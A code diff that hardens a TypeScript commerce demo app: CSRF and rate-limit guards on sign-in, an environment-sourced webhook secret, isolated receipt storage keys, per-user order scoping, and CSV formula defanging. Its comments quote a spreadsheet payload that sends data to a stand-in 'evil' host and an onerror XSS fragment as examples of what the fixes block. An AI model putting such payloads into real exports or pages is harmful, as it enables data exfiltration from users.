@@ -1,3 +1,5 @@
+import { randomUUID } from 'node:crypto';
+
 import { createMemoryStorage, form, stripeSignature } from '@jiso/core';
 import {
   createMemoryMutationReplayStore,
@@ -21,6 +23,7 @@ import {
   s,
   session,
   webhook,
+  type GuardResult,
   type MutationFail,
   type MutationWireHeaderSource,
   type StoredFileUpload,
@@ -172,6 +175,15 @@ const commerceAuthUsers = new Map<
   ],
 ]);
 
+// SECURITY (SECURITY_FINDINGS.md M9): the set of valid order owners. The commerce
+// demo's user directory is the in-memory `commerceAuthUsers` map (there is no users
+// table), so the payment webhook validates the body `userId` against these known
+// ids rather than trusting an arbitrary attacker-supplied value. Production must
+// instead resolve the owner from verified provider metadata.
+export function commerceKnownUserIds(): ReadonlySet<string> {
+  return new Set([...commerceAuthUsers.values()].map((user) => user.id));
+}
+
 export function createCommerceBetterAuth(): CommerceBetterAuth {
   const sessionUserIds = new Map<string, string>();
 
@@ -239,11 +251,106 @@ export const commerceSessionProvider = commerceSession.provider(
 
 export const commerceAdminGuard = betterAuthRole<CommerceAuthRequest>('admin');
 
+// SECURITY (SECURITY_FINDINGS.md M7): the sign-in mutation must throttle attempts to
+// blunt online password brute-force / credential stuffing. We key by a per-client
+// identifier derived from request headers with `per:'global'` rather than the default
+// `per:'session'`, because there is no session yet on a login attempt and the default
+// keying collapses every unauthenticated request into a single shared `'anonymous'`
+// bucket (which would let one attacker exhaust the limit and lock out all users).
+// Guards only receive the request (not the parsed input), so the submitted email is
+// not available here; production should key by client IP (e.g. the upstream proxy's
+// `X-Forwarded-For`). We also enforce a same-origin check (M6) ahead of the throttle.
+function commerceSignInClientKey(request: { headers?: Headers }): string {
+  const headers = request.headers;
+  const forwarded =
+    headers?.get('x-forwarded-for')?.split(',')[0]?.trim() ||
+    headers?.get('x-real-ip')?.trim() ||
+    headers?.get('user-agent')?.trim() ||
+    'unknown-client';
+  return `signin:${forwarded}`;
+}
+
+// SECURITY (SECURITY_FINDINGS.md M6): the pre-session login CSRF token is derived from
+// a process-wide constant (`authCsrfId`) and a shipped example secret, so the token
+// `HMAC(static_secret, constant)` is forgeable offline — enabling login CSRF. Full
+// per-browser pre-session-cookie wiring is too invasive for this shell structure
+// (route pages return strings and cannot set a cookie on the login GET, and guards
+// only receive the request — not a response to set cookies on), so we add an
+// Origin / Sec-Fetch-Site same-origin check to the unauthenticated sign-in mutation.
+//
+// RESIDUAL LIMITATION: this defends against cross-site form posts from browsers that
+// send `Origin` / `Sec-Fetch-Site` (all current browsers do for cross-origin POSTs).
+// It does NOT defend against a non-browser client that omits both headers, and the
+// underlying constant-token weakness remains. A production app should ALSO bind the
+// pre-session token to a per-browser random value (random pre-session cookie used as
+// the csrf `sessionId` source) so the synchronizer token is unforgeable.
+function commerceSignInSameOriginGuard<Request extends { headers?: Headers; url?: string }>(): (
+  request: Request,
+) => GuardResult {
+  return (request: Request) => {
+    const headers = request.headers;
+    if (!headers) return true;
+
+    const secFetchSite = headers.get('sec-fetch-site');
+    if (secFetchSite) {
+      // `same-origin`/`same-site`/`none` (direct navigation) are accepted; only an
+      // explicit `cross-site` is a cross-origin form post we must reject.
+      return secFetchSite === 'cross-site' ? sameOriginGuardFailure() : true;
+    }
+
+    const origin = headers.get('origin');
+    if (!origin) return true; // No Origin header (e.g. same-origin GET-then-POST in older browsers, server-side calls).
+
+    const selfHost = sameOriginHost(request);
+    if (!selfHost) return true; // Cannot determine our own host (e.g. test harness request without a URL); fail open rather than break legitimate flows.
+
+    let originHost: string;
+    try {
+      originHost = new URL(origin).host;
+    } catch {
+      return sameOriginGuardFailure();
+    }
+
+    return originHost === selfHost ? true : sameOriginGuardFailure();
+  };
+}
+
+function sameOriginHost(request: { headers?: Headers; url?: string }): string | undefined {
+  const host = request.headers?.get('host');
+  if (host) return host;
+  if (request.url) {
+    try {
+      return new URL(request.url).host;
+    } catch {
+      return undefined;
+    }
+  }
+  return undefined;
+}
+
+function sameOriginGuardFailure(): GuardResult {
+  return {
+    auth: 'unauthorized',
+    code: 'UNAUTHORIZED',
+    payload: { reason: 'cross-origin sign-in rejected' },
+    status: 422,
+  };
+}
+
 export const commerceSignIn = betterAuthSignInEmailMutation<'auth/sign-in', CommerceAuthRequest>(
   commerceBetterAuth,
   {
     csrf: commerceAuthCsrf,
     defaultRedirectTo: '/cart',
+    guard: guards.all<CommerceAuthRequest>(
+      commerceSignInSameOriginGuard<CommerceAuthRequest>(),
+      guards.rateLimit<CommerceAuthRequest>({
+        key: commerceSignInClientKey,
+        max: 5,
+        per: 'global',
+        windowMs: 60_000,
+      }),
+    ),
   },
 );
 
@@ -286,7 +393,33 @@ export interface PaymentWebhookInput {
 }
 
 export const commerceAttachmentStorage = createMemoryStorage();
-export const commercePaymentWebhookSecret = 'whsec_commerce_reference_app';
+
+// SECURITY (SECURITY_FINDINGS.md M9): the webhook signing secret must come from the
+// environment and the app must fail closed when it is unset, so a deployment can
+// never silently ship with a public, repo-readable HMAC key (which would let anyone
+// reading this repo forge a valid signature and POST attacker-chosen orders). The
+// `EXAMPLE_ONLY_*` literal is a documented placeholder used only by the test suite /
+// local demo; production must set `COMMERCE_WEBHOOK_SECRET`.
+export const EXAMPLE_ONLY_COMMERCE_PAYMENT_WEBHOOK_SECRET = 'whsec_commerce_reference_app';
+
+export function resolveCommercePaymentWebhookSecret(
+  env: Record<string, string | undefined> = process.env,
+): string {
+  const secret = env.COMMERCE_WEBHOOK_SECRET;
+  if (secret && secret.length > 0) return secret;
+
+  // Fail closed in production; only the local demo / tests fall back to the
+  // documented EXAMPLE_ONLY_* placeholder.
+  if (env.NODE_ENV === 'production') {
+    throw new Error(
+      'COMMERCE_WEBHOOK_SECRET must be set in production; refusing to start with a known placeholder webhook secret.',
+    );
+  }
+
+  return EXAMPLE_ONLY_COMMERCE_PAYMENT_WEBHOOK_SECRET;
+}
+
+export const commercePaymentWebhookSecret = resolveCommercePaymentWebhookSecret();
 export const commercePaymentReplayStore = createMemoryMutationReplayStore();
 
 export type AddToCartFailure = MutationFail<string, unknown>;
@@ -359,11 +492,37 @@ export const addToCart = mutation('cart/add', {
 // override; regenerating restores derivation (the §10.4 pair-by-pair contract).
 export const addToCartOptimistic = cartAddDerivedOptimistic;
 
+// SECURITY (SECURITY_FINDINGS.md M8): the receipt storage key must never derive
+// solely from the client-supplied filename. A shared `receipts/${file.name}` key
+// lets two users uploading the same filename collide — the later upload overwrites
+// the earlier user's blob, and the download route (which streams whatever bytes
+// live at the row's stored key) then serves one user's bytes to another.
+//
+// We namespace every upload with a server-generated, unguessable random id and
+// sanitize the trailing filename segment so distinct uploads can never collide and
+// one user's bytes can never land under another user's key. The `store({ key })`
+// callback only receives the `FileLike` (name/size/type) — it has no access to the
+// session — so the random id (not the session user id) is what guarantees
+// isolation; the unguessable prefix also prevents key-guessing IDOR. The DB row
+// persists this exact key (`input.receipt.key`), so the download route's
+// row -> blob lookup stays consistent.
+function sanitizeReceiptFilename(name: string): string {
+  // Strip any path separators (`/`, `\`) and parent-dir traversal so the trailing
+  // segment can never escape the namespaced prefix; fall back to a stable default.
+  const base = name.split(/[\\/]/).pop() ?? '';
+  const cleaned = base.replace(/[^A-Za-z0-9._-]/g, '_').replace(/^\.+/, '');
+  return cleaned.length > 0 ? cleaned : 'receipt';
+}
+
+function receiptStorageKey(file: { name: string }): string {
+  return `receipts/${randomUUID()}/${sanitizeReceiptFilename(file.name)}`;
+}
+
 export const uploadReceipt = mutation('order/receipt', {
   input: s.object({
     orderId: s.string(),
     receipt: s.file({ maxBytes: 64 * 1024, mime: ['application/pdf', 'image/png'] }).store({
-      key: (file) => `receipts/${file.name}`,
+      key: (file) => receiptStorageKey(file),
       metadata: (file) => ({ filename: file.name }),
       storage: commerceAttachmentStorage,
     }),
@@ -432,6 +591,35 @@ export const paymentWebhook = webhook('payment/stripe', {
 
     const paid = input.data.object;
     const tx = context.tx as CommerceDb;
+
+    // SECURITY (SECURITY_FINDINGS.md M9): never trust attacker-chosen `productId` /
+    // `userId` straight from the webhook body. A signed-event sender otherwise picks
+    // both the product and the victim account the order lands on.
+    //
+    // (1) Reject the event if `productId` is not a real catalog row, so a poisoned
+    //     id (e.g. `=HYPERLINK(...)` / `<img onerror=...>`) can never be persisted
+    //     and then fan out into the order-history HTML / CSV export sinks.
+    const product = (
+      await tx
+        .select({ id: products.id })
+        .from(products)
+        .where(eq(products.id, paid.productId))
+        .limit(1)
+    )[0];
+    if (!product) {
+      return context.fail('UNKNOWN_PRODUCT', { productId: paid.productId }, { status: 422 });
+    }
+
+    // (2) Resolve the order owner against an existing user. The commerce demo has no
+    //     real Stripe customer -> user mapping, so at minimum we require that the
+    //     body `userId` corresponds to a known user and never blindly trust an
+    //     arbitrary value. PRODUCTION MUST bind the owner to VERIFIED provider
+    //     metadata (e.g. the Stripe customer id resolved from the verified event /
+    //     a customers table), NOT to a client-chosen `userId` in the event body.
+    if (!commerceKnownUserIds().has(paid.userId)) {
+      return context.fail('UNKNOWN_USER', { userId: paid.userId }, { status: 422 });
+    }
+
     await tx.insert(orders).values({
       id: paid.id,
       productId: paid.productId,
@@ -452,10 +640,14 @@ export const paymentWebhook = webhook('payment/stripe', {
 export const orderCsvRoute = route('/exports/orders.csv', {
   guard: betterAuthAuthed<CommerceRequest>(),
   async page(_context, request) {
-    const allOrders = await loadOrdersForCsv(request.db);
-    return respond.stream(ordersCsvStream(allOrders, request.session.user.id), {
+    // SECURITY (SECURITY_FINDINGS.md M9): scope the export to the authenticated
+    // user at the SOURCE read (not just the in-stream filter), so the CSV only
+    // ever contains the requester's own orders.
+    const userId = request.session.user.id;
+    const ownOrders = await loadOrdersForCsv(request.db, userId);
+    return respond.stream(ordersCsvStream(ownOrders, userId), {
       contentType: 'text/csv; charset=utf-8',
-      etag: `"orders-${allOrders.length}"`,
+      etag: `"orders-${ownOrders.length}"`,
       filename: 'orders.csv',
     });
   },
@@ -606,10 +798,14 @@ export async function renderProductGridDeferredStream(
   });
 }
 
-export async function renderOrderHistory(db: CommerceDb): Promise<string> {
+export async function renderOrderHistory(db: CommerceDb, userId?: string): Promise<string> {
   // SPEC.md section 4.2: the markup comes from the compiled TSX component
   // (src/components/order-history.tsx); fw-c and fw-deps are compiler-derived.
-  const history = await loadOrderHistory(db);
+  // SECURITY (SECURITY_FINDINGS.md M9): order history is per-user. With no
+  // authenticated user (e.g. the read-only static export, or an unauthenticated
+  // viewer) we default-deny and render an EMPTY history rather than leaking every
+  // user's orders. When a user id is present we scope the read to that user.
+  const history: OrderHistoryResult = userId ? await loadOrderHistory(db, userId) : { items: [] };
   return OrderHistory.definition.render({ orderHistory: history });
 }
 
@@ -626,8 +822,11 @@ export function renderReceiptUploadForm(orderId = 'order-1'): string {
   ].join('');
 }
 
-async function loadOrdersForCsv(db: CommerceDb): Promise<OrderHistoryResult['items']> {
-  return (await loadOrderHistory(db)).items;
+async function loadOrdersForCsv(
+  db: CommerceDb,
+  userId: string,
+): Promise<OrderHistoryResult['items']> {
+  return (await loadOrderHistory(db, userId)).items;
 }
 
 function ordersCsvStream(
@@ -655,8 +854,16 @@ function ordersCsvStream(
   });
 }
 
+// SECURITY (SECURITY_FINDINGS.md M9): RFC-4180 quoting alone does NOT neutralize
+// CSV/spreadsheet formula injection. A cell beginning with `= + - @`, TAB, or CR is
+// interpreted as a live formula by Excel / Google Sheets, so a poisoned value such
+// as `=HYPERLINK("http://evil/?"&A1)` would execute / exfiltrate when a user opens
+// the exported `orders.csv`. We defang any such cell by prefixing a single quote
+// (`'`) BEFORE applying the RFC-4180 quoting below, which forces the spreadsheet to
+// treat the content as literal text.
 function csvCell(value: string): string {
-  return /[",\n\r]/.test(value) ? `"${value.replaceAll('"', '""')}"` : value;
+  const defanged = /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
+  return /[",\n\r]/.test(defanged) ? `"${defanged.replaceAll('"', '""')}"` : defanged;
 }
 
 // CartBadge and OrderHistory are authored as TSX components under
@@ -700,7 +907,9 @@ export async function renderCartPageBody(
     { readOnly: options.readOnly },
   );
   const receiptForm = options.readOnly ? '' : renderReceiptUploadForm();
-  return `<main class="mx-auto max-w-4xl"><fw-fragment target="cart-badge">${cartBadge}</fw-fragment><fw-fragment target="product-grid">${productGrid}</fw-fragment><fw-fragment target="order-history">${await renderOrderHistory(db)}${receiptForm}</fw-fragment></main>`;
+  // SECURITY (SECURITY_FINDINGS.md M9): scope order history to the session user.
+  const orderHistory = await renderOrderHistory(db, request?.session?.user?.id);
+  return `<main class="mx-auto max-w-4xl"><fw-fragment target="cart-badge">${cartBadge}</fw-fragment><fw-fragment target="product-grid">${productGrid}</fw-fragment><fw-fragment target="order-history">${orderHistory}${receiptForm}</fw-fragment></main>`;
 }
 
 export function submitAddToCartNoJs(rawInput: unknown, request: CommerceRequest) {
@@ -741,7 +950,8 @@ export function submitAddToCart(
         },
       ),
       {
-        render: () => renderOrderHistory(request.db),
+        // SECURITY (SECURITY_FINDINGS.md M9): scope to the session user.
+        render: () => renderOrderHistory(request.db, request.session?.user?.id),
         stylesheets: commerceStylesheets,
         target: 'order-history',
       },
